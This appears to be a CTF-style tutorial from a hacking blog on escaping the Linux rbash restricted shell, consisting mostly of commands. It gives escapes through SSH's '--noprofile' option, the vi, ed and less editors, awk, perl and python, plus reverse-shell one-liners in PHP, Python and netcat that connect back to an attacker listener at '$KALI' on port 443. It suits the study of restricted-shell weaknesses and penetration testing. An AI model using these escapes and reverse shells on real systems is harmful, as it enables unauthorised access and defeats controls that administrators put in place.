https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/

#### rbash escape through SSH
Our First Method is Escaping the rbash shell through ssh many ctf playing times we have ssh username and password but our shell is restricted with rbash. we can easily bypass this rbash shell using extra argument bash noprofile

```bash - kali
ssh $USER@$TARGET
```

```bash - target
echo $SHELL
```

```bash - target
cd ../
```

we can bypass the rbash shell using the no-profile extra parameter

```bash - kali
ssh $USER@$TARGET -t "bash --noprofile"
```

```bash - target
cd ../
```

#### rbash escape through editors
Linux has many editors we can bypass the rbash using these editor commands

#### bypass rbash using vi editor
First, we open the vi editor then we used: set option and we create a shell name variable and in this variable, we set our bash environment location. run the command one by one

run the vi command and our vi editor is open using the set mode we can bypass the restricted rbash shell

```bash - target
vi
```

```bash - taret
:set shell=/bin/bash
```

```bash - target
:shell
```
  
#### escaping rbash – ed editor
ed is another Linux editor simple we can run ed edit mode without selecting any file then we type bash path

```bash - target
cd /home
```

```bash - target
echo $SHELL
```

```bash - target
ed
```

```bash - target
!'/bin/bash'
```

```bash - target
pwd
```

#### escape rbash through reverse shell
We can bypass the rbash shell through different Linux reverse shell **Note:** before executing the reverse shell we need to start a net-cat listener.

##### rbash shell bypass – php
```bash - target
cd /
```

```bash - target
echo $SHELL
```

we open two ssh connections our cd command is currently not working before execute the reverse shell command firstly we start our netcat listener. in this case, we are using the same machine you can use your localhost IP for reverse connection

[[rlwrap]]

```bash - target
php -r '$sock=fsockopen("$KALI",443);exec("/bin/bash -i <&3 >&3 2>&3");'
```

After executing the reverse shell command we got the reverse connection target machine. and we successfully bypass the restricted rbash shell.

```bash - target
echo $SHELL
```

```bash - target
cd /
```

```bash - target
pwd
```

#### rbash shell bypass – python
this is another way to bypass the rbash shell using python reverse shell remember before executing the reverse shell command you need to start your netcat listener.

```bash - target
cd /
```

```bash - target
echo $SHELL
```

[[rlwrap]]

```bash - target
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$KALI",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

```bash - target
cd /
```

```bash - target
pwd
```

#### rbash shell bypass – netcat
```bash - target
cd /home
```

```bash - target
echo $SHELL
```

[[rlwrap]]

```bash - target
nc  $KALI 443 -e /bin/bash
```

#### rbash escape with python
If the target system already installed any python version we run these commands for bypassing the rbash shell

```bash - target
echo $SHELL
```

```bash - target
cd ../
```

```bash - target
python -c 'import os; os.system("/bin/bash");'
```

```bash - target
python3 -c 'import os; os.system("/bin/bash");'
```

and again we escape the rbash shell using python command executing -c argument.

```bash - target
cd /home
```

```bash - target
cd ../
```

### rbash escape **Awk**
```bash - target
cd /home
```

```bash - target
echo $SHELL
```

```bash - target
awk 'BEGIN {system("/bin/bash")}' cd /home cd ~ pwd
```

```bash - target
awk 'BEGIN {system("/bin/bash")}'
```

```bash - target
cd /home
```

```bash - target
cd ~
```

```bash - target
pwd
```

### rbash escape perl
```bash - target
cd /
```

```bash - target
echo $SHELL
```

```bash - target
perl -e 'system("/bin/bash");'
```

```bash - target
cd /
```

```bash - target
cd /home
```

### rbash bypass through binary file
```bash - target
cd /
```

```bash - target
echo $SHELL
```

```bash - target
less anyfile.txt
```

```bash - target
!'bash'
```

```bash - target
cd /
```

```bash - target
cd /home
```

```bash - target
pwd
```

```bash - target
echo $SHELL
```
